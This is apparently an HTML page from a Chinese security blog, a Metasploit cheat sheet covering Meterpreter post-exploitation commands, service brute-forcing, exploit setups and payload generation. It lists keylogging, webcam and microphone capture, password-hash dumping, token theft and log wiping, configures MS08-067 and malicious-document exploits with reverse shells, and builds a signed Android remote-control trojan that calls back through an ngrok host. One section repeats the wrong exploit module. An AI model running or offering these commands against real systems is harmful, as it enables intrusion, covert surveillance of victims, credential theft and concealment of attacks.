@@ -1,0 +1,1037 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="常用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192search 搜索 search -f *">
+<meta name="keywords" content="Meterpreter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit总结--持续更新">
+<meta property="og:url" content="https://wh0ale.github.io/2019/08/30/Metasploit总结-持续更新/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="常用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192search 搜索 search -f *">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/%E6%8F%90%E6%9D%83%E7%AF%87.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.331Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit总结--持续更新">
+<meta name="twitter:description" content="常用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192search 搜索 search -f *">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/%E6%8F%90%E6%9D%83%E7%AF%87.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/08/30/Metasploit总结-持续更新/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Metasploit总结--持续更新 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/08/30/Metasploit总结-持续更新/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Metasploit总结--持续更新
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-30 15:51:11" itemprop="dateCreated datePublished" datetime="2019-08-30T15:51:11+08:00">2019-08-30</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">14k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">12 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">search 搜索 search -f *.jpg</span><br><span class="line">download</span><br><span class="line">webcam_stream -i 1/2 打开前置或后置摄像头</span><br><span class="line">check_root 检测root</span><br><span class="line">dump_calllog 下载电话记录</span><br><span class="line">dump_contacts 下载信息记录</span><br><span class="line">geolocate 定位，需要下载谷歌地图</span><br><span class="line"></span><br><span class="line">基本命令：</span><br><span class="line">#1 首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；</span><br><span class="line">#2 初始化MSF数据库（关键步骤！）：msfdb init；</span><br><span class="line">#3 运行msfconsole：msfconsole；</span><br><span class="line">#4 在msf中查看数据库连接状态：db_status。</span><br><span class="line">如果不想每次开机都这样，还可以配置随系统启动</span><br><span class="line">update-rc.d postgresql enable</span><br><span class="line">update-rc.d metasploit enable</span><br><span class="line"></span><br><span class="line">/usr/share/metasploit-framework      Kali中msf的路径为</span><br><span class="line">/usr/share/metasploit-framework/scripts/resource/      脚本文件</span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/multi/http</span><br><span class="line">常用命令：msfconsole -r /usr/share/metasploit-framework/scripts/resource/powershell.rc</span><br><span class="line"></span><br><span class="line">netstat -anp |grep 端口            kill -9 PID//相当于windows下的</span><br><span class="line">netstat -ano    netstat -aon|findstr &quot;3306&quot;   tasklist|findstr &quot;4936&quot;   taskkill /f /t /im spx.exe 结束进程</span><br><span class="line">find / -name hamster.txt    寻找某个文件</span><br><span class="line">find / -name hamster.txt找命令</span><br><span class="line">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y 源的更新与清理</span><br><span class="line">apt-get install linux-headers-$(uname -r)     #linux内核更新</span><br><span class="line">dpkg --add-architecture i386        .添加对32位的支持</span><br><span class="line">ps 查看进程</span><br><span class="line">migrate 注入进程  进程ID 一般选择explorer.exe对应的PID</span><br><span class="line">run vnc 查看远程桌面</span><br><span class="line"></span><br><span class="line">文件操作</span><br><span class="line">cat 查看文件</span><br><span class="line">edit 编辑文件</span><br><span class="line">upload 上传文件</span><br><span class="line">download 下载文件</span><br><span class="line">rm 删除文件</span><br><span class="line">mkdir 创建文件夹</span><br><span class="line">rmdir 删除文件夹</span><br><span class="line"></span><br><span class="line">网络及系统操作</span><br><span class="line">enumdesktops 在线用户数</span><br><span class="line">uictl disable keyboard 让键盘失效</span><br><span class="line">uictl enable keyboard 恢复键盘</span><br><span class="line">record_mic -d 10 音频录制 录制10秒</span><br><span class="line">webcam_stream 开启摄像头</span><br><span class="line">getsystem 获取最高权限</span><br><span class="line">hashdump 密码hash</span><br><span class="line"></span><br><span class="line">help 查看帮助</span><br><span class="line">run scriptname 运行脚本</span><br><span class="line">sysinfo 系统基本信息</span><br><span class="line">ls 列目录</span><br><span class="line">use priv 运行提权组件</span><br><span class="line">ps 列进程</span><br><span class="line">migrate PID PID 迁移</span><br><span class="line">use incognito token 窃取</span><br><span class="line">list_tokens -u 查看可用用户token</span><br><span class="line">list_tokens -g 查看可用组token</span><br><span class="line">impersonate_token DOMAIN_NAME\USERNAME 模仿token</span><br><span class="line">steal_token PID 窃取PID 所属token 并模仿</span><br><span class="line">drop_token 停止模仿token</span><br><span class="line">getsystem 获取SYSTEM 权限</span><br><span class="line">shell 运行shell</span><br><span class="line">execute -f cmd.exe -i 交互式运行cmd</span><br><span class="line">execute -f cmd.exe -i -t 使用可用token 运行</span><br><span class="line">execute -f cmd.exe -i -H -t 同上，同时隐藏进程</span><br><span class="line">rev2self 返回至初始用户</span><br><span class="line">reg command 修改注册表</span><br><span class="line">setkesktop number 切换至另一已登录用户屏幕</span><br><span class="line">screenshot 截屏</span><br><span class="line">upload file 上传文件</span><br><span class="line">download file 下载文件</span><br><span class="line">keyscan_start 开始截取击键记录</span><br><span class="line">keyscan_stop 停止截取击键记录</span><br><span class="line">getprivs 尽可能提升权限</span><br><span class="line">uictl enable keyboard/mouse 获取键盘或鼠标的控制权</span><br><span class="line">background 将当前meterpreter shell 转入后台</span><br><span class="line">hashdump 导出所有用户hash</span><br><span class="line">use sniffer 加载嗅探模块</span><br><span class="line">sniffer_interfaces 查看可用网卡接口</span><br><span class="line">sniffer_dump interfaceID pcapname 开始嗅探</span><br><span class="line">sniffer_start interfaceID packet-buffer 指定buffer 范围嗅探</span><br><span class="line">sniffer_stats interfaceID 抓取统计信息</span><br><span class="line">sniffer_stop interfaceID 停止嗅探</span><br><span class="line">add_user username password -h ip 添加用户</span><br><span class="line">add_group_user “Domain Admins” username -h ip 添加用户至管理组</span><br><span class="line">clearev 清空日志</span><br><span class="line">timestomp 改变文件属性如创建时间等</span><br><span class="line">reboot 重启</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="检测端口服务"><a href="#检测端口服务" class="headerlink" title="检测端口服务"></a>检测端口服务</h2><p>检测端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; nmap –sT –A –P0 192.168.1.130 #探测开放服务</span><br><span class="line">假如已经探测到1433（TCP）和1434(UDP)端口（mssql），</span><br><span class="line">msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放</span><br></pre></td></tr></table></figure>
+
+<p>检测服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br></pre></td></tr></table></figure>
+
+<h2 id="mssql开发利用"><a href="#mssql开发利用" class="headerlink" title="mssql开发利用"></a>mssql开发利用</h2><p>对各个ip是否有mssql服务的探测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping //测试MSSQL的存在和信息</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.2.1-255</span><br><span class="line">set threads 30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>对扫描到的ip进行爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_login</span><br><span class="line">show options</span><br><span class="line">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt</span><br><span class="line">set RHOSTS 192.168.1.130</span><br><span class="line">set THREADS 10</span><br><span class="line">set verbose false</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>sa权限对其利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin/mssql/mssql_exec</span><br><span class="line">set rhost 192.168.2.10</span><br><span class="line">set password sa</span><br><span class="line">set CMD cmd.exe /c echo hello</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h2 id="爆破ssh模块"><a href="#爆破ssh模块" class="headerlink" title="爆破ssh模块"></a>爆破ssh模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set rhosts 7.7.7.20</span><br><span class="line">set username root</span><br><span class="line">set pass_file /root/pass.txt //加载字典，可以收集密码做字典</span><br><span class="line">set threads 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过nmap扫描基本漏洞"><a href="#通过nmap扫描基本漏洞" class="headerlink" title="通过nmap扫描基本漏洞"></a>通过nmap扫描基本漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap –script=vuln 受害靶机ip地址</span><br><span class="line">msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..</span><br></pre></td></tr></table></figure>
+
+<h2 id="445端口扫描系统信息"><a href="#445端口扫描系统信息" class="headerlink" title="445端口扫描系统信息"></a>445端口扫描系统信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.211.1-200</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/sniffer/psnuffle</span><br></pre></td></tr></table></figure>
+
+<h2 id="SNMP扫描和枚举"><a href="#SNMP扫描和枚举" class="headerlink" title="SNMP扫描和枚举"></a>SNMP扫描和枚举</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/snmp/snmp_login</span><br></pre></td></tr></table></figure>
+
+<h2 id="VNC身份验证"><a href="#VNC身份验证" class="headerlink" title="VNC身份验证"></a>VNC身份验证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set RHOSTS 192.168.211.137</span><br><span class="line">set threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="FTP-主机扫描"><a href="#FTP-主机扫描" class="headerlink" title="FTP 主机扫描"></a>FTP 主机扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 255</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="扫描FTP-匿名登录"><a href="#扫描FTP-匿名登录" class="headerlink" title="扫描FTP 匿名登录"></a>扫描FTP 匿名登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/anonymos</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="VNC-空口令"><a href="#VNC-空口令" class="headerlink" title="VNC 空口令"></a>VNC 空口令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set RHOSTS 192.168.1.111</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="Open-X11-空口令"><a href="#Open-X11-空口令" class="headerlink" title="Open X11 空口令"></a>Open X11 空口令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/x11/open_x11</span><br><span class="line">set RHOST 192.168.1.0/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h1 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h1><h2 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08_067"></a>ms08_067</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set RHOST 192.168.211.137</span><br><span class="line">set LHOST 192.168.211.137</span><br><span class="line">set threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="ms12-004"><a href="#ms12-004" class="headerlink" title="ms12_004"></a>ms12_004</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>
+
+<h2 id="ms14-002内核提权（使用于32bit）"><a href="#ms14-002内核提权（使用于32bit）" class="headerlink" title="ms14_002内核提权（使用于32bit）"></a>ms14_002内核提权（使用于32bit）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ms_ndproxy</span><br><span class="line">set session 2</span><br></pre></td></tr></table></figure>
+
+<p>设置一个选项或取消设置set/unset<br>设置或取消全局选项setg/unsetg 例如设置LHOST 就可以用setg，避免后面重复设置<br>保存全局选项的设置save 当下次启动仍然生效</p>
+<h2 id="使用用户端攻击方式-client-side-attacks"><a href="#使用用户端攻击方式-client-side-attacks" class="headerlink" title="使用用户端攻击方式(client-side attacks)"></a>使用用户端攻击方式(client-side attacks)</h2><p>①主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览<br>器，pdf 阅读器，office 软件等，最终获取系统权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use windows/browser/ms10_002_aurora</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set URIPATH /</span><br><span class="line">set LHOST 192.168.211.179</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit –z</span><br><span class="line">sessions –i 1</span><br><span class="line">run migrate</span><br></pre></td></tr></table></figure>
+
+<p>②文件格式exploit<br>利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。<br>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use windows/fileformat/ms11_006_createsizeddibsection info</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.211.179</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>此时会生成一个msf.doc 的word 文档，在目标机器上打开此文档，然后本机监听端口<br>等待反弹连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.211.179</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit –j</span><br></pre></td></tr></table></figure>
+
+<h1 id="Meterpreter-Payload"><a href="#Meterpreter-Payload" class="headerlink" title="Meterpreter Payload"></a>Meterpreter Payload</h1><h2 id="metasploit安卓木马远控"><a href="#metasploit安卓木马远控" class="headerlink" title="metasploit安卓木马远控"></a>metasploit安卓木马远控</h2><p>metasploit之安卓木马结合ngrok远控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=free.ngrok.cc LPORT=11*** R &gt; /root/Desktop/123.apk</span><br><span class="line"></span><br><span class="line">keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000    执行下列命令签名。首先使用密钥工具创建密钥库</span><br><span class="line">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore 123.apk aliasname  然后使用JARsigner签名APK</span><br><span class="line">jarsigner -verify -verbose -certs 123.apk  再用JARsigner验证签名</span><br></pre></td></tr></table></figure>
+
+<p>meterpreter收到shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">Set PAYLOAD android/meterpreter/reverse_tcp</span><br><span class="line">SET LHOST 192.168.253.128</span><br><span class="line">SET LPORT 2222</span><br></pre></td></tr></table></figure>
+
